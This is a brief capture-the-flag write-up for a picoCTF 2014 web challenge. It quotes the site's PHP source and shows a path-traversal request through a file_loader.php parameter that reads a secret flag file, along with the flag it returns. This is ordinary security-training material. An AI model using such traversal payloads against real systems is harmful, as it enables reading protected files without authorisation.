# Potentially Hidden Password - 100

```
This Daedalus Corp. website loads images in a rather odd way... [Source Code]
```

Source:

````
<html>
  <head>
    <title>Daedalus Corperation - Headquarters</title>
    <link rel="stylesheet" type="text/css" href="bootstrap.min.css">
  </head>
  <style>
    .zone {
       width: 300px;
    }
  </style>
  <body>
    <nav class="navbar navbar-default" role="navigation">
      <div class="container-fluid">
	<div class="navbar-header">
	  <img src="daedalus.png" style="height: 80px"><span style="margin-left: 10px; font-size: 19px;line-height: 21px;height: 60px;">Daedalus Corperation</span>
	</div>
      </div>
    </nav>
    <div class="container">
      <div class="row">
	<div class="col-md-12">
	  <?php
	     $config_file = fopen("/resources/config/admin_mode.config", "r");
	     if (fgets($config_file) === "true") {
	        $flag_file = fopen("/resources/secrets/flag", "r");
	        echo fgets($flag_file);
	        flose($flag_file);
	     }
	     fclose($config_file);
       	   ?>
	</div>

	<h2>Daedalus Headquarters</h2>
	<p>Our wonderful headquarters has many awesome rooms!</p>
	<center>
	  <img src="file_loader.php?file=zone1.jpg" class="zone"/>
	  <img src="file_loader.php?file=zone2.jpg" class="zone"/>
	  <img src="file_loader.php?file=zone3.jpg" class="zone"/><br><br>
	  <img src="file_loader.php?file=zone4.jpg" class="zone"/>
	  <img src="file_loader.php?file=zone5.jpg" class="zone"/>
	  <img src="file_loader.php?file=zone6.jpg" class="zone"/><br>
	</center>
      </div>
    </div>
  </body>
</html>
```

if (fgets($config_file) === "true") then we can read the flag.
But I also notice that file_loader.php?file=zoze6.jpg... 

Hm...It does some qurying. Lets see if we can use this to go up the directory.

```
http://web2014.picoctf.com/potentially-hidden-password-3878213/file_loader.php?file=/../secrets/flag

i_like_being_included
```

Wala! There is our flag:

```
Flag:i_like_being_included
```

After all it was unncessary to meet that condition. 
